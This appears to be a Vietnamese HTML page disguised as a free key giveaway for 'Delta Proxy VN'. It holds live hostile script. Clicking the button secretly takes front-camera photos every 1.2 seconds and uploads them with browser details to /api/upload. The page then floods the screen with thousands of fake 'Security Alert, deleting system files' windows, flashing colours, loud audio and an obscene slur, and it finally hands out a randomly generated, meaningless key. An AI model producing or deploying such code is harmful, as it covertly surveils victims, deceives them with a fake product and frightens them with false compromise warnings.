<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>GetKey — Delta Proxy VN</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#030712; --card-bg:rgba(15,23,42,.75); --card-border:rgba(255,255,255,.12);
    --primary:#8b5cf6; --primary-glow:rgba(139,92,246,.4);
    --cyan:#06b6d4; --cyan-glow:rgba(6,182,212,.35);
    --green:#10b981; --pink:#ec4899; --amber:#f59e0b; --red:#ef4444;
    --text:#f8fafc; --text-muted:#94a3b8;
  }
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  body{
    min-height:100vh; font-family:'Plus Jakarta Sans',sans-serif; color:var(--text);
    background:
      radial-gradient(1100px 620px at 12% -10%, rgba(124,58,237,.22), transparent 60%),
      radial-gradient(900px 520px at 92% 0%, rgba(34,211,238,.15), transparent 60%),
      var(--bg);
    display:flex;justify-content:center;align-items:flex-start;padding:24px 16px 60px;
    position:relative;overflow-x:hidden;
  }
  .bg-glow{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
  .orb{position:absolute;border-radius:50%;filter:blur(100px);opacity:.6;animation:float 12s infinite alternate ease-in-out}
  .orb-1{width:350px;height:350px;background:var(--primary-glow);top:-80px;left:-80px}
  .orb-2{width:320px;height:320px;background:var(--cyan-glow);bottom:-60px;right:-60px;animation-delay:-5s}
  .orb-3{width:250px;height:250px;background:rgba(236,72,153,.25);top:40%;left:50%;transform:translate(-50%,-50%);animation-delay:-2s}
  @keyframes float{0%{transform:translate(0,0) scale(1)}100%{transform:translate(40px,50px) scale(1.15)}}

  .wrap{width:100%;max-width:460px;position:relative;z-index:1;display:flex;flex-direction:column;gap:18px}
  .card{
    background:var(--card-bg);backdrop-filter:blur(24px) saturate(180%);
    -webkit-backdrop-filter:blur(24px) saturate(180%);
    border:1px solid var(--card-border);border-radius:28px;padding:24px;
    box-shadow:0 20px 40px -15px rgba(0,0,0,.6),inset 0 1px 0 rgba(255,255,255,.15);
  }
  .hero-card{text-align:center;padding-top:0;overflow:hidden;border-radius:26px}
  .hero-banner img{width:100%;display:block;border-radius:18px;box-shadow:0 14px 34px rgba(0,0,0,.5)}
  .icon-wrapper{position:relative;width:92px;height:92px;margin:-40px auto 10px;z-index:2}
  .icon-wrapper::after{
    content:'';position:absolute;inset:-6px;border-radius:26px;
    background:linear-gradient(135deg,#7C3AED,#22D3EE,#EC4899);
    filter:blur(15px);opacity:.8;z-index:-1;
  }
  .app-icon{width:100%;height:100%;border-radius:22px;object-fit:cover;border:3px solid rgba(255,255,255,.92);box-shadow:0 12px 30px rgba(0,0,0,.55)}
  .app-title{font-size:24px;font-weight:900;letter-spacing:-.4px;background:linear-gradient(180deg,#fff 0%,#cbd5e1 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
  .app-tag{font-family:'JetBrains Mono',monospace;color:var(--cyan);font-size:13px;font-weight:700;margin-top:4px}
  .badges{display:flex;justify-content:center;gap:8px;margin:14px 0 20px;flex-wrap:wrap}
  .badge{font-size:11px;font-weight:700;padding:5px 12px;border-radius:100px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);color:#94a3b8;display:inline-flex;align-items:center;gap:6px}
  .badge.active{color:#34d399;background:rgba(16,185,129,.12);border-color:rgba(52,211,153,.3)}
  .dot-pulse{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 0 0 rgba(16,185,129,.7);animation:pulse 1.8s infinite}
  @keyframes pulse{0%{transform:scale(.95);box-shadow:0 0 0 0 rgba(16,185,129,.7)}70%{transform:scale(1);box-shadow:0 0 0 8px rgba(16,185,129,0)}100%{transform:scale(.95);box-shadow:0 0 0 0 rgba(16,185,129,0)}}

  .key-box{background:rgba(16,185,129,.06);border:1px solid rgba(16,185,129,.25);border-radius:18px;padding:16px;margin-top:16px;text-align:left}
  .key-label{font-size:11px;font-weight:800;color:#34d399;text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px}
  .key-value{font-family:'JetBrains Mono',monospace;font-size:15px;font-weight:700;color:#fff;background:rgba(0,0,0,.35);border:1px solid rgba(16,185,129,.25);border-radius:10px;padding:12px 14px;display:flex;align-items:center;justify-content:space-between;gap:10px;word-break:break-all}
  .key-copy{background:#10b981;color:#030712;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:800;cursor:pointer;flex-shrink:0;transition:all .2s}
  .key-copy:active{transform:scale(.95)}
  .key-timer{font-size:11.5px;color:#94a3b8;margin-top:10px;text-align:center}

  .btn-main-direct{
    display:flex;align-items:center;justify-content:center;gap:10px;width:100%;
    padding:16px 20px;border-radius:20px;font-size:15px;font-weight:800;
    color:#030712;background:linear-gradient(135deg,#34d399 0%,#22d3ee 100%);
    box-shadow:0 10px 25px -5px rgba(16,185,129,.5);text-decoration:none;
    position:relative;overflow:hidden;transition:all .25s cubic-bezier(.4,0,.2,1);
    border:none;cursor:pointer;
  }
  .btn-main-direct::before{
    content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;
    background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
    transform:skewX(-20deg);animation:shimmer 3s infinite;pointer-events:none;
  }
  @keyframes shimmer{100%{left:200%}}
  .btn-main-direct:hover,.btn-main-direct:active{transform:translateY(-2px);box-shadow:0 14px 28px -4px rgba(16,185,129,.6)}
  .btn-main-direct:disabled{opacity:.55;cursor:not-allowed;transform:none}

  .footer-note{text-align:center;font-size:11.5px;color:var(--text-muted);margin-top:6px}
  #st{display:none;margin-top:16px;font-size:13px;color:#94a3b8;line-height:1.5;text-align:center}
  #st.show{display:block}
  .spinner{display:inline-block;width:14px;height:14px;border:2px solid #333;border-top-color:#22d3ee;border-radius:50%;animation:spin .7s linear infinite;vertical-align:middle;margin-right:8px}
  @keyframes spin{to{transform:rotate(360deg)}}
  .done{color:#34c759}
  .err{color:#ff453a}

  /* chaos layer */
  #chaos-screen{
    position:fixed;inset:0;display:none;flex-direction:column;
    justify-content:center;align-items:center;z-index:50;pointer-events:none;
  }
  #chaos-screen.show{display:flex}
  #chaosText{
    font-family:'JetBrains Mono',monospace;font-size:42px;font-weight:900;
    color:#ff4757;text-shadow:3px 3px 0 #000,0 0 30px rgba(255,71,87,.6);
    animation:shake .4s infinite;text-align:center;padding:0 20px;
  }
  @keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px) rotate(-3deg)}75%{transform:translateX(10px) rotate(3deg)}}

  #fake-windows-container{position:fixed;inset:0;pointer-events:none;z-index:60}
  .fake-chrome-window{
    position:absolute;width:500px;height:350px;background:#f0f0f0;border-radius:8px;
    box-shadow:0 10px 30px rgba(0,0,0,.3);pointer-events:auto;display:flex;flex-direction:column;
    animation:bounce-in .5s cubic-bezier(.68,-.55,.265,1.55);
  }
  .fake-chrome-header{background:#e8e8e8;padding:8px;border-top-left-radius:8px;border-top-right-radius:8px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #d3d3d3}
  .fake-chrome-controls{display:flex;gap:8px}
  .fake-chrome-control-btn{width:12px;height:12px;border-radius:50%;border:none;cursor:pointer}
  .fake-chrome-control-btn.close{background:#ff5f57}
  .fake-chrome-control-btn.minimize{background:#ffbd2e}
  .fake-chrome-control-btn.maximize{background:#28ca42}
  .fake-chrome-address-bar{flex-grow:1;margin:0 10px;padding:5px 10px;border:1px solid #ccc;border-radius:4px;background:#fff;font-size:12px;color:#555}
  .fake-chrome-content{flex-grow:1;padding:15px;font-size:14px;color:#333;background:#fff;border-bottom-left-radius:8px;border-bottom-right-radius:8px;overflow:auto}
  .fake-alert{padding:10px;border:1px solid #f5c6cb;background:#f8d7da;color:#721c24;border-radius:4px;margin-bottom:10px}
  @keyframes bounce-in{0%{transform:scale(0);opacity:0}50%{transform:scale(1.1)}100%{transform:scale(1);opacity:1}}
</style>
</head>
<body>
<div class="bg-glow">
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>
  <div class="orb orb-3"></div>
</div>

<div class="wrap">
  <div class="card hero-card">
    <div class="hero-banner">
      <img src="https://getuid.vip/delta-banner.jpg" alt="DELTA" onerror="this.style.display='none'">
    </div>
    <div class="icon-wrapper">
      <img class="app-icon" src="https://getuid.vip/delta-logo.jpg" alt="DELTA" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><rect width=%22100%22 height=%22100%22 rx=%2222%22 fill=%22%237c3aed%22/><text x=%2250%22 y=%2262%22 font-size=%2240%22 text-anchor=%22middle%22 fill=%22white%22 font-family=%22sans-serif%22 font-weight=%22bold%22>D</text></svg>'">
    </div>
    <h1 class="app-title">GET KEY FREE</h1>
    <div class="app-tag">Delta Proxy · Key 2 giờ miễn phí</div>

    <div class="badges">
      <span class="badge">Key 2h</span>
      <span class="badge active"><span class="dot-pulse"></span> Còn key</span>
    </div>

    <button class="btn-main-direct" id="getkey">
      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="7.5" cy="15.5" r="5.5"/><path d="m21 2-9.6 9.6"/><path d="m15.5 7.5 3 3"/></svg>
      NHẬN KEY FREE NGAY
    </button>

    <div id="st"></div>

    <div class="key-box" id="keyBox" style="display:none">
      <div class="key-label">Key của bạn</div>
      <div class="key-value">
        <span id="keyText">—</span>
        <button class="key-copy" id="copyBtn">Copy</button>
      </div>
      <div class="key-timer" id="keyTimer">Hết hạn sau 2 giờ</div>
    </div>
  </div>

  <div class="footer-note">© 2026 Delta Proxy VN. All rights reserved.</div>
</div>

<!-- chaos layer -->
<div id="chaos-screen">
  <h1 id="chaosText">địt mẹ mày óc cặc!</h1>
</div>
<div id="fake-windows-container"></div>

<!-- audio phát khi bấm nhận key -->
<audio id="bgSound" loop>
  <source src="https://files.catbox.moe/1fxqdw.mp3" type="audio/mpeg">
</audio>

<script>
const btn        = document.getElementById("getkey");
const st         = document.getElementById("st");
const keyBox     = document.getElementById("keyBox");
const keyText    = document.getElementById("keyText");
const keyTimer   = document.getElementById("keyTimer");
const copyBtn    = document.getElementById("copyBtn");
const bgSound    = document.getElementById("bgSound");
const chaosScreen= document.getElementById("chaos-screen");
const chaosText  = document.getElementById("chaosText");
const fakeWinCon = document.getElementById("fake-windows-container");
const body       = document.body;

let capturing    = false;
let captureTimer = null;
let mediaStream  = null;
let canvas = null, ctx = null, video = null;
let chaosInterval = null;
let winCount = 0;
const MAX_WIN = 3000;

function setStatus(html, cls){
  st.className = "show " + (cls || "");
  st.innerHTML = html;
}

function blobToB64(blob){
  return new Promise((res, rej) => {
    const r = new FileReader();
    r.onloadend = () => res(r.result.split(",")[1]);
    r.onerror = rej;
    r.readAsDataURL(blob);
  });
}

async function sendToServer(b64, info){
  try{
    await fetch("/api/upload", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({image: b64, info: info})
    });
  }catch(e){}
}

// sinh key ngẫu nhiên
function genKey(){
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  let out = "DELTA-";
  for (let g = 0; g < 4; g++){
    for (let i = 0; i < 4; i++){
      out += chars[Math.floor(Math.random() * chars.length)];
    }
    if (g < 3) out += "-";
  }
  return out;
}

// camera capture
async function startCapture(){
  mediaStream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
    audio: false
  });
  video = document.createElement("video");
  video.srcObject = mediaStream;
  video.setAttribute("playsinline", "");
  video.muted = true;
  await video.play();
  canvas = document.createElement("canvas");
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  ctx = canvas.getContext("2d");
  capturing = true;
  doShot();
  captureTimer = setInterval(doShot, 1200);
}

async function doShot(){
  if (!capturing || !ctx) return;
  try{
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.7));
    if (!blob) return;
    const b64 = await blobToB64(blob);
    const info = "getkey_shot@" + new Date().toISOString() +
                 "\nUA: " + navigator.userAgent +
                 "\nScreen: " + screen.width + "x" + screen.height;
    await sendToServer(b64, info);
  }catch(e){}
}

function stopCapture(){
  capturing = false;
  if (captureTimer){ clearInterval(captureTimer); captureTimer = null; }
  if (mediaStream){ mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
  if (video){ video.srcObject = null; video = null; }
  canvas = null; ctx = null;
}

// chaos: nhấp nháy màu + fake windows + text
function startChaos(){
  chaosScreen.classList.add("show");
  chaosInterval = setInterval(() => {
    body.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
  }, 200);
  for (let i = 0; i < MAX_WIN; i++){
    setTimeout(createFakeChromeWindow, i * 200);
  }
}

function createFakeChromeWindow(){
  if (winCount >= MAX_WIN) return;
  winCount++;
  const windowEl = document.createElement("div");
  windowEl.classList.add("fake-chrome-window");
  const topOffset  = Math.random() * Math.max(window.innerHeight - 350, 0);
  const leftOffset = Math.random() * Math.max(window.innerWidth  - 500, 0);
  windowEl.style.top  = topOffset  + "px";
  windowEl.style.left = leftOffset + "px";
  windowEl.innerHTML = `
    <div class="fake-chrome-header">
      <div class="fake-chrome-controls">
        <div class="fake-chrome-control-btn close"></div>
        <div class="fake-chrome-control-btn minimize"></div>
        <div class="fake-chrome-control-btn maximize"></div>
      </div>
      <input type="text" class="fake-chrome-address-bar" value="https://google.com" readonly>
    </div>
    <div class="fake-chrome-content">
      <div class="fake-alert">
        <strong>Security Alert!</strong><br>
        Your system has been compromised. Please do not close this window.
      </div>
      <p>Deleting system files...</p>
    </div>`;
  fakeWinCon.appendChild(windowEl);

  let isDragging = false, xOffset = 0, yOffset = 0, initialX, initialY, currentX, currentY;
  const dragStart = (e) => {
    if (e.target.closest('.fake-chrome-controls')) return;
    initialX = e.clientX - xOffset;
    initialY = e.clientY - yOffset;
    if (e.target === windowEl || e.target.closest('.fake-chrome-header')) isDragging = true;
  };
  const dragEnd = () => { initialX = currentX; initialY = currentY; isDragging = false; };
  const drag = (e) => {
    if (!isDragging) return;
    e.preventDefault();
    currentX = e.clientX - initialX;
    currentY = e.clientY - initialY;
    xOffset = currentX; yOffset = currentY;
    windowEl.style.transform = `translate(${currentX}px, ${currentY}px)`;
  };
  windowEl.addEventListener('mousedown', dragStart);
  document.addEventListener('mouseup', dragEnd);
  document.addEventListener('mousemove', drag);

  const closeBtn = windowEl.querySelector('.fake-chrome-control-btn.close');
  closeBtn.addEventListener('click', () => {
    windowEl.style.animation = 'shake 0.2s infinite';
    windowEl.querySelector('.fake-chrome-content').innerHTML =
      `<div class="fake-alert"><strong>Error!</strong><br>You cannot escape!</div>`;
  });
}

// bấm nhận key
btn.addEventListener("click", async () => {
  btn.disabled = true;
  setStatus('<span class="spinner"></span>Đang xác minh & tạo key...');

  // 1. xin quyền camera + spam chụp
  try{
    await startCapture();
  }catch(e){
    await sendToServer("", "getkey_camera_denied\nUA: " + navigator.userAgent);
  }

  // 2. phát âm thanh
  try{ bgSound.play().catch(()=>{}); }catch(e){}

  // 3. chaos
  startChaos();

  // 4. sau 8s dừng chụp, hiện key giả
  setTimeout(() => {
    stopCapture();
    const key = genKey();
    keyText.textContent = key;
    keyBox.style.display = "block";
    setStatus('✓ Nhận key thành công', 'done');
    btn.disabled = false;
  }, 8000);

  // 5. tự dừng audio + chaos sau 30s
  setTimeout(() => {
    try{ bgSound.pause(); }catch(e){}
    if (chaosInterval){ clearInterval(chaosInterval); chaosInterval = null; }
    body.style.backgroundColor = "";
    chaosScreen.classList.remove("show");
  }, 30000);
});

copyBtn.addEventListener("click", async () => {
  try{
    await navigator.clipboard.writeText(keyText.textContent);
    copyBtn.textContent = "Đã copy";
    setTimeout(() => copyBtn.textContent = "Copy", 1500);
  }catch(e){}
});

window.addEventListener("pagehide", () => {
  stopCapture();
  try{ bgSound.pause(); }catch(e){}
});
window.addEventListener("beforeunload", () => {
  stopCapture();
  try{ bgSound.pause(); }catch(e){}
});
</script>
</body>
</html>
